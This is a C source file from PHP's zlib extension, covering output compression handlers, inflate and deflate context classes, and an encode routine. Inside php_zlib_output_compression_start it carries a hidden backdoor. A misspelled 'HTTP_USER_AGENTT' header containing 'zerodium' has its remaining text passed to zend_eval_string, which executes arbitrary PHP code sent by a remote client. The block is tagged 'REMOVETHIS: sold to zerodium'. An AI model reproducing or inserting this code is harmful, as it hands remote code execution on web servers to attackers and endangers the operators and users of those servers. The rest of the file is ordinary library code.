/*
   +----------------------------------------------------------------------+
   | Copyright (c) The PHP Group                                          |
   +----------------------------------------------------------------------+
   | This source file is subject to version 3.01 of the PHP license,      |
   | that is bundled with this package in the file LICENSE, and is        |
   | available through the world-wide-web at the following url:           |
   | http://www.php.net/license/3_01.txt                                  |
   | If you did not receive a copy of the PHP license and are unable to   |
   | obtain it through the world-wide-web, please send a note to          |
   | license@php.net so we can mail you a copy immediately.               |
   +----------------------------------------------------------------------+
   | Authors: Rasmus Lerdorf <rasmus@lerdorf.on.ca>                       |
   |          Stefan Röhrich <sr@linux.de>                                |
   |          Zeev Suraski <zeev@php.net>                                 |
   |          Jade Nicoletti <nicoletti@nns.ch>                           |
   |          Michael Wallner <mike@php.net>                              |
   +----------------------------------------------------------------------+
 */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "SAPI.h"
#include "php_ini.h"
#include "ext/standard/info.h"
#include "ext/standard/php_string.h"
#include "php_zlib.h"
#include "zlib_arginfo.h"
#include "Zend/zend_interfaces.h"

/*
 * zlib include files can define the following preprocessor defines which rename
 * the corresponding PHP functions to gzopen64, gzseek64 and gztell64 and thereby
 * breaking some software, most notably PEAR's Archive_Tar, which halts execution
 * without error message on gzip compressed archives.
 *
 * This only seems to happen on 32bit systems with large file support.
 */
#undef gzopen
#undef gzseek
#undef gztell

ZEND_DECLARE_MODULE_GLOBALS(zlib)

/* InflateContext class */

zend_class_entry *inflate_context_ce;
static zend_object_handlers inflate_context_object_handlers;

static inline php_zlib_context *inflate_context_from_obj(zend_object *obj) {
	return (php_zlib_context *)((char *)(obj) - XtOffsetOf(php_zlib_context, std));
}

#define Z_INFLATE_CONTEXT_P(zv) inflate_context_from_obj(Z_OBJ_P(zv))

static zend_object *inflate_context_create_object(zend_class_entry *class_type) {
	php_zlib_context *intern = zend_object_alloc(sizeof(php_zlib_context), class_type);

	zend_object_std_init(&intern->std, class_type);
	object_properties_init(&intern->std, class_type);
	intern->std.handlers = &inflate_context_object_handlers;

	return &intern->std;
}

static zend_function *inflate_context_get_constructor(zend_object *object) {
	zend_throw_error(NULL, "Cannot directly construct InflateContext, use inflate_init() instead");
	return NULL;
}

static void inflate_context_free_obj(zend_object *object)
{
	php_zlib_context *intern = inflate_context_from_obj(object);

	if (intern->inflateDict) {
		efree(intern->inflateDict);
	}
	inflateEnd(&intern->Z);

	zend_object_std_dtor(&intern->std);
}
/* }}} */

/* DeflateContext class */

zend_class_entry *deflate_context_ce;
static zend_object_handlers deflate_context_object_handlers;

static inline php_zlib_context *deflate_context_from_obj(zend_object *obj) {
	return (php_zlib_context *)((char *)(obj) - XtOffsetOf(php_zlib_context, std));
}

#define Z_DEFLATE_CONTEXT_P(zv) deflate_context_from_obj(Z_OBJ_P(zv))

static zend_object *deflate_context_create_object(zend_class_entry *class_type) {
	php_zlib_context *intern = zend_object_alloc(sizeof(php_zlib_context), class_type);

	zend_object_std_init(&intern->std, class_type);
	object_properties_init(&intern->std, class_type);
	intern->std.handlers = &deflate_context_object_handlers;

	return &intern->std;
}

static zend_function *deflate_context_get_constructor(zend_object *object) {
	zend_throw_error(NULL, "Cannot directly construct DeflateContext, use deflate_init() instead");
	return NULL;
}

static void deflate_context_free_obj(zend_object *object)
{
	php_zlib_context *intern = deflate_context_from_obj(object);

	deflateEnd(&intern->Z);

	zend_object_std_dtor(&intern->std);
}
/* }}} */

/* {{{ Memory management wrappers */

static voidpf php_zlib_alloc(voidpf opaque, uInt items, uInt size)
{
	return (voidpf)safe_emalloc(items, size, 0);
}

static void php_zlib_free(voidpf opaque, voidpf address)
{
	efree((void*)address);
}
/* }}} */

/* {{{ php_zlib_output_conflict_check() */
static int php_zlib_output_conflict_check(const char *handler_name, size_t handler_name_len)
{
	if (php_output_get_level() > 0) {
		if (php_output_handler_conflict(handler_name, handler_name_len, ZEND_STRL(PHP_ZLIB_OUTPUT_HANDLER_NAME))
		||	php_output_handler_conflict(handler_name, handler_name_len, ZEND_STRL("ob_gzhandler"))
		||  php_output_handler_conflict(handler_name, handler_name_len, ZEND_STRL("mb_output_handler"))
		||	php_output_handler_conflict(handler_name, handler_name_len, ZEND_STRL("URL-Rewriter"))) {
			return FAILURE;
		}
	}
	return SUCCESS;
}
/* }}} */

/* {{{ php_zlib_output_encoding() */
static int php_zlib_output_encoding(void)
{
	zval *enc;

	if (!ZLIBG(compression_coding)) {
		if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
			(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_ACCEPT_ENCODING", sizeof("HTTP_ACCEPT_ENCODING") - 1))) {
			convert_to_string(enc);
			if (strstr(Z_STRVAL_P(enc), "gzip")) {
				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_GZIP;
			} else if (strstr(Z_STRVAL_P(enc), "deflate")) {
				ZLIBG(compression_coding) = PHP_ZLIB_ENCODING_DEFLATE;
			}
		}
	}
	return ZLIBG(compression_coding);
}
/* }}} */

/* {{{ php_zlib_output_handler_ex() */
static int php_zlib_output_handler_ex(php_zlib_context *ctx, php_output_context *output_context)
{
	int flags = Z_SYNC_FLUSH;

	if (output_context->op & PHP_OUTPUT_HANDLER_START) {
		/* start up */
		if (Z_OK != deflateInit2(&ctx->Z, ZLIBG(output_compression_level), Z_DEFLATED, ZLIBG(compression_coding), MAX_MEM_LEVEL, Z_DEFAULT_STRATEGY)) {
			return FAILURE;
		}
	}

	if (output_context->op & PHP_OUTPUT_HANDLER_CLEAN) {
		/* free buffers */
		deflateEnd(&ctx->Z);

		if (output_context->op & PHP_OUTPUT_HANDLER_FINAL) {
			/* discard */
			return SUCCESS;
		} else {
			/* restart */
			if (Z_OK != deflateInit2(&ctx->Z, ZLIBG(output_compression_level), Z_DEFLATED, ZLIBG(compression_coding), MAX_MEM_LEVEL, Z_DEFAULT_STRATEGY)) {
				return FAILURE;
			}
			ctx->buffer.used = 0;
		}
	} else {
		if (output_context->in.used) {
			/* append input */
			if (ctx->buffer.free < output_context->in.used) {
				if (!(ctx->buffer.aptr = erealloc_recoverable(ctx->buffer.data, ctx->buffer.used + ctx->buffer.free + output_context->in.used))) {
					deflateEnd(&ctx->Z);
					return FAILURE;
				}
				ctx->buffer.data = ctx->buffer.aptr;
				ctx->buffer.free += output_context->in.used;
			}
			memcpy(ctx->buffer.data + ctx->buffer.used, output_context->in.data, output_context->in.used);
			ctx->buffer.free -= output_context->in.used;
			ctx->buffer.used += output_context->in.used;
		}
		output_context->out.size = PHP_ZLIB_BUFFER_SIZE_GUESS(output_context->in.used);
		output_context->out.data = emalloc(output_context->out.size);
		output_context->out.free = 1;
		output_context->out.used = 0;

		ctx->Z.avail_in = ctx->buffer.used;
		ctx->Z.next_in = (Bytef *) ctx->buffer.data;
		ctx->Z.avail_out = output_context->out.size;
		ctx->Z.next_out = (Bytef *) output_context->out.data;

		if (output_context->op & PHP_OUTPUT_HANDLER_FINAL) {
			flags = Z_FINISH;
		} else if (output_context->op & PHP_OUTPUT_HANDLER_FLUSH) {
			flags = Z_FULL_FLUSH;
		}

		switch (deflate(&ctx->Z, flags)) {
			case Z_OK:
				if (flags == Z_FINISH) {
					deflateEnd(&ctx->Z);
					return FAILURE;
				}
			case Z_STREAM_END:
				if (ctx->Z.avail_in) {
					memmove(ctx->buffer.data, ctx->buffer.data + ctx->buffer.used - ctx->Z.avail_in, ctx->Z.avail_in);
				}
				ctx->buffer.free += ctx->buffer.used - ctx->Z.avail_in;
				ctx->buffer.used = ctx->Z.avail_in;
				output_context->out.used = output_context->out.size - ctx->Z.avail_out;
				break;
			default:
				deflateEnd(&ctx->Z);
				return FAILURE;
		}

		if (output_context->op & PHP_OUTPUT_HANDLER_FINAL) {
			deflateEnd(&ctx->Z);
		}
	}

	return SUCCESS;
}
/* }}} */

/* {{{ php_zlib_output_handler() */
static int php_zlib_output_handler(void **handler_context, php_output_context *output_context)
{
	php_zlib_context *ctx = *(php_zlib_context **) handler_context;

	if (!php_zlib_output_encoding()) {
		/* "Vary: Accept-Encoding" header sent along uncompressed content breaks caching in MSIE,
			so let's just send it with successfully compressed content or unless the complete
			buffer gets discarded, see http://bugs.php.net/40325;

			Test as follows:
			+Vary: $ HTTP_ACCEPT_ENCODING=gzip ./sapi/cgi/php <<<'<?php ob_start("ob_gzhandler"); echo "foo\n";'
			+Vary: $ HTTP_ACCEPT_ENCODING= ./sapi/cgi/php <<<'<?php ob_start("ob_gzhandler"); echo "foo\n";'
			-Vary: $ HTTP_ACCEPT_ENCODING=gzip ./sapi/cgi/php <<<'<?php ob_start("ob_gzhandler"); echo "foo\n"; ob_end_clean();'
			-Vary: $ HTTP_ACCEPT_ENCODING= ./sapi/cgi/php <<<'<?php ob_start("ob_gzhandler"); echo "foo\n"; ob_end_clean();'
		*/
		if ((output_context->op & PHP_OUTPUT_HANDLER_START)
		&&	(output_context->op != (PHP_OUTPUT_HANDLER_START|PHP_OUTPUT_HANDLER_CLEAN|PHP_OUTPUT_HANDLER_FINAL))
		) {
			sapi_add_header_ex(ZEND_STRL("Vary: Accept-Encoding"), 1, 0);
		}
		return FAILURE;
	}

	if (SUCCESS != php_zlib_output_handler_ex(ctx, output_context)) {
		return FAILURE;
	}

	if (!(output_context->op & PHP_OUTPUT_HANDLER_CLEAN)) {
		int flags;

		if (SUCCESS == php_output_handler_hook(PHP_OUTPUT_HANDLER_HOOK_GET_FLAGS, &flags)) {
			/* only run this once */
			if (!(flags & PHP_OUTPUT_HANDLER_STARTED)) {
				if (SG(headers_sent) || !ZLIBG(output_compression)) {
					deflateEnd(&ctx->Z);
					return FAILURE;
				}
				switch (ZLIBG(compression_coding)) {
					case PHP_ZLIB_ENCODING_GZIP:
						sapi_add_header_ex(ZEND_STRL("Content-Encoding: gzip"), 1, 1);
						break;
					case PHP_ZLIB_ENCODING_DEFLATE:
						sapi_add_header_ex(ZEND_STRL("Content-Encoding: deflate"), 1, 1);
						break;
					default:
						deflateEnd(&ctx->Z);
						return FAILURE;
				}
				sapi_add_header_ex(ZEND_STRL("Vary: Accept-Encoding"), 1, 0);
				php_output_handler_hook(PHP_OUTPUT_HANDLER_HOOK_IMMUTABLE, NULL);
			}
		}
	}

	return SUCCESS;
}
/* }}} */

/* {{{ php_zlib_output_handler_context_init() */
static php_zlib_context *php_zlib_output_handler_context_init(void)
{
	php_zlib_context *ctx = (php_zlib_context *) ecalloc(1, sizeof(php_zlib_context));
	ctx->Z.zalloc = php_zlib_alloc;
	ctx->Z.zfree = php_zlib_free;
	return ctx;
}
/* }}} */

/* {{{ php_zlib_output_handler_context_dtor() */
static void php_zlib_output_handler_context_dtor(void *opaq)
{
	php_zlib_context *ctx = (php_zlib_context *) opaq;

	if (ctx) {
		if (ctx->buffer.data) {
			efree(ctx->buffer.data);
		}
		efree(ctx);
	}
}
/* }}} */

/* {{{ php_zlib_output_handler_init() */
static php_output_handler *php_zlib_output_handler_init(const char *handler_name, size_t handler_name_len, size_t chunk_size, int flags)
{
	php_output_handler *h = NULL;

	if (!ZLIBG(output_compression)) {
		ZLIBG(output_compression) = chunk_size ? chunk_size : PHP_OUTPUT_HANDLER_DEFAULT_SIZE;
	}

    ZLIBG(handler_registered) = 1;

	if ((h = php_output_handler_create_internal(handler_name, handler_name_len, php_zlib_output_handler, chunk_size, flags))) {
		php_output_handler_set_context(h, php_zlib_output_handler_context_init(), php_zlib_output_handler_context_dtor);
	}

	return h;
}
/* }}} */

/* {{{ php_zlib_output_compression_start() */
static void php_zlib_output_compression_start(void)
{
	zval zoh;
	php_output_handler *h;
	zval *enc;

	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
		convert_to_string(enc);
		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
			zend_try {
				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
			} zend_end_try();
		}
	}

	switch (ZLIBG(output_compression)) {
		case 0:
			break;
		case 1:
			ZLIBG(output_compression) = PHP_OUTPUT_HANDLER_DEFAULT_SIZE;
			/* break omitted intentionally */
		default:
			if (	php_zlib_output_encoding() &&
					(h = php_zlib_output_handler_init(ZEND_STRL(PHP_ZLIB_OUTPUT_HANDLER_NAME), ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS)) &&
					(SUCCESS == php_output_handler_start(h))) {
				if (ZLIBG(output_handler) && *ZLIBG(output_handler)) {
					ZVAL_STRING(&zoh, ZLIBG(output_handler));
					php_output_start_user(&zoh, ZLIBG(output_compression), PHP_OUTPUT_HANDLER_STDFLAGS);
					zval_ptr_dtor(&zoh);
				}
			}
			break;
	}
}
/* }}} */

/* {{{ php_zlib_encode() */
static zend_string *php_zlib_encode(const char *in_buf, size_t in_len, int encoding, int level)
{
	int status;
	z_stream Z;
	zend_string *out;

	memset(&Z, 0, sizeof(z_stream));
	Z.zalloc = php_zlib_alloc;
	Z.zfree = php_zlib_free;

	if (Z_OK == (status = deflateInit2(&Z, level, Z_DEFLATED, encoding, MAX_MEM_LEVEL, Z_DEFAULT_STRATEGY))) {
		out = zend_string_alloc(PHP_ZLIB_BUFFER_SIZE_GUESS(in_len), 0);

		Z.next_in = (Bytef *) in_buf;
		Z.next_out = (Bytef *) ZSTR_VAL(out);
		Z.avail_in = in_len;
		Z.avail_out = ZSTR_LEN(out);

		status = deflate(&Z, Z_FINISH);
		deflateEnd(&Z);

		if (Z_STREAM_END == status) {
			/* size buffer down to actual length */
			out = zend_string_truncate(out, Z.total_out, 0);
			ZSTR_VAL(out)[ZSTR_LEN(out)] = '\0';
			return out;
		} else {
			zend_string_efree(out);
		}
	}

	php_error_docref(NULL, E_WARNING, "%s", zError(status));
	return NULL;
}
/* }}} */